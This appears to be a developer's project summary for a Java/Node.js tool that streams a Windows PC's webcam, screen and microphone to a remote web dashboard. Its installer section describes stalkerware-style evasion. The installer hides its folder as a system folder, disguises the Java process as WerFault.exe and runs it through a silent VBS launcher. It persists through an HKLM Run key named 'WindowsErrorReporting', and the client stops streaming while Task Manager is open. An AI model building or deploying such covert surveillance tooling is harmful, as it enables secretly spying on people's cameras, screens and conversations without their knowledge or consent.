# Project Summary

## What This Is
A remote PC monitoring system with:
- Camera feed streaming
- Screen capture streaming
- Microphone audio streaming (live playback + waveform visualizer on dashboard)
- Web dashboard to view all connected PCs
- Record/download video from dashboard
- Rename PCs (stored in localStorage)
- Uninstall button per PC from dashboard
- Self-updating Java client
- One-click installer (ins.bat)
- Auto-pause when Task Manager is open on the monitored PC

---

## Stack
- **Server**: Node.js + WebSockets (`ws` library), hosted on **Render.com** (free tier)
- **Dashboard**: Plain HTML/JS at `server/public/index.html`
- **Camera client**: Java (JavaCV + OpenCV for camera, AWT Robot for screen capture)
- **Installer**: `ins.bat` (batch script, runs as admin)

---

## File Structure
```
reyhancam/
├── camera/
│   ├── CameraClient.java       # Main Java client
│   ├── TrustAllSSL.java
│   ├── pom.xml                 # Maven build (javacv-platform + java-websocket)
│   └── target/
│       └── camera-client-1.0-jar-with-dependencies.jar
├── server/
│   ├── server.js               # Node.js WebSocket server
│   ├── package.json
│   ├── Dockerfile
│   └── public/
│       └── index.html          # Dashboard UI
├── Installer.java              # Java installer (alternative to ins.bat)
├── ins.bat                     # Main installer script
└── SUMMARY.md
```

---

## Server (Render.com)
- URL: **https://pccon.onrender.com**
- GitHub repo: **https://github.com/reyHay/reyhancam**
- Render auto-deploys on every `git push` to main
- Root directory: `server`, start command: `node server.js`
- Port: reads from `process.env.PORT` (Render sets this automatically)

---

## Camera Client (CameraClient.java)
- Connects to `wss://pccon.onrender.com`
- Sends `hello` message with `{id, hasCamera, hasScreen}`
- Streams camera frames as base64 JPEG (`type: frame`) at 30fps, 1280x720
- Streams screen frames as base64 JPEG (`type: screen_frame`) at 15fps, native resolution
- JPEG quality: 90% (explicit ImageWriteParam)
- Listens for `{type: "uninstall"}` command → removes registry entry + deletes install folder + exits
- Self-updates on startup: checks `version.txt` from GitHub release, downloads new jar if version differs, replaces self and relaunches
- **Task Manager watcher**: polls every 1s via PowerShell `GetForegroundWindow` — if `taskmgr` is focused, pauses all frame sending until it's closed
- Current version: **3**
- Built with: `cd camera && mvn package -q`
- Run with: `java --enable-native-access=ALL-UNNAMED -jar target/camera-client-1.0-jar-with-dependencies.jar`

### Known issues
- JavaCV `javacv-platform` dependency is ~937MB (includes all platform natives, only Windows ones load at runtime)
- Self-update renames jar files — can fail if a leftover `camera-client-update.jar` exists (fixed in v1.3)

---

## Installer (ins.bat)
- Requests UAC admin elevation
- Finds Java on the system (checks PATH, `C:\Program Files\Java\*`, `C:\Program Files\Microsoft\jdk-*`, Eclipse Adoptium)
- If Java not found: downloads JDK 21 from Oracle and installs silently
- Creates `C:\ProgramData\CameraService\` (hidden+system folder)
- Downloads `camera-client.jar` from GitHub releases (skips if already exists)
- Copies `java.exe` to `C:\ProgramData\CameraService\WerFault.exe` (process appears as WerFault.exe in Task Manager — blends in with Windows Error Reporting)
- Copies `jvm.dll` to `C:\ProgramData\CameraService\server\jvm.dll` (required by the renamed exe)
- Creates `launch.vbs` (runs WerFault.exe silently, no console window)
- Registers `wscript.exe "C:\ProgramData\CameraService\launch.vbs"` in `HKLM\...\Run` as `WindowsErrorReporting`
- Launches immediately

### To install on a new PC
1. Copy `ins.bat` to the target PC
2. Double-click it
3. Accept UAC prompt
4. Wait for download (~937MB first time)
5. PC appears on dashboard automatically

### To turn it off temporarily (no uninstall)
Open PowerShell as Administrator and run:
```powershell
Stop-Process -Name WerFault -Force -ErrorAction SilentlyContinue
Stop-Process -Name wscript -Force -ErrorAction SilentlyContinue
```
The client will restart on next reboot since the autorun registry entry is still active.

---

### Full Uninstall Tutorial


Right-click the Start menu → "Windows PowerShell (Admin)" or "Terminal (Admin)"


```powershell
Stop-Process -Name WerFault -Force -ErrorAction SilentlyContinue
Stop-Process -Name java -Force -ErrorAction SilentlyContinue
Stop-Process -Name wscript -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

Remove-Item -Recurse -Force "C:\ProgramData\CameraService"

Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsErrorReporting" -ErrorAction SilentlyContinue

Test-Path "C:\ProgramData\CameraService"
```
Should return `False`. Done.

---

### To reinstall / update (run PowerShell as Administrator)
```powershell
Stop-Process -Name WerFault -Force -ErrorAction SilentlyContinue
Stop-Process -Name java -Force -ErrorAction SilentlyContinue
Stop-Process -Name wscript -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Remove-Item -Recurse -Force "C:\ProgramData\CameraService"
```
Then re-run `ins.bat`.

---

## GitHub Releases (for self-update)
- Repo: https://github.com/reyHay/reyhancam/releases
- Each release must have:
  - `camera-client.jar` (the fat jar renamed)
  - `version.txt` (plain text, just the version number e.g. `1.4`)
- Current latest: **v2.9**

### Release workflow
1. Edit `VERSION` string in `CameraClient.java` (e.g. `"1.4"`)
2. `cd camera && mvn package -q`
3. Go to GitHub → New Release → tag `vX.X`
4. Upload `camera/target/camera-client-1.0-jar-with-dependencies.jar` as `camera-client.jar`
5. Upload `version.txt` containing just the version number
6. Publish

---

## Dashboard (index.html)
- Shows all connected PCs as cards
- Camera card (📷) and Screen card (🖥) per PC
- Frames rendered via `<canvas>` + `drawImage` — no flicker
- Click PC name to rename (saved in localStorage)
- ⏺ Record button → records to off-screen canvas → ⬇ Download as `.webm`
- 🗑 Uninstall button → confirms → sends uninstall command to PC

---

## Deployment
Server is deployed on Render.com. To redeploy after changes:
```bash
git add .
git commit -m "your message"
git push
```
Render auto-deploys on push. No manual steps needed for the server.

For the Java client, build and upload a new GitHub release (see Release workflow above).

---

## Git Workflow
```powershell
$env:PATH += ";C:\Program Files\Git\bin"   # if git not in PATH
git add .
git commit -m "message"
git push
```

---

## How to Build & Deploy a New Version

### Step 1 — Build the Java client
Open PowerShell in the project root folder and run:
```powershell
cd camera; mvn package -q
```
- `cd camera` moves into the camera folder
- `mvn package -q` compiles the Java code and packages it into a fat jar (quiet mode, no spam)
- Output jar is at: `camera/target/camera-client-1.0-jar-with-dependencies.jar`

### Step 2 — Release on GitHub
1. Go to https://github.com/reyHay/reyhancam/releases/new
2. Set tag to `vX.X` (e.g. `v2.4`)
3. Upload `camera/target/camera-client-1.0-jar-with-dependencies.jar` — rename it to `camera-client.jar` before uploading
4. Create a file called `version.txt` containing just the version number (e.g. `2.4`) and upload it too
5. Click **Publish release**

### Step 3 — Push server/dashboard changes to Render
Open PowerShell in the project root and run:
```powershell
$env:PATH += ";C:\Program Files\Git\bin"
git add .
git commit -m "v2.4 - describe your changes here"
git push
```
- `$env:PATH += ...` adds Git to the current session so PowerShell can find it
- `git add .` stages all changed files
- `git commit -m "..."` saves a snapshot with a message
- `git push` uploads to GitHub — Render auto-deploys the server within ~3 minutes

### Step 4 — Update clients
Hit the **↑ Update** button on the dashboard for each connected PC.
The client will download the new jar from GitHub and relaunch itself automatically.

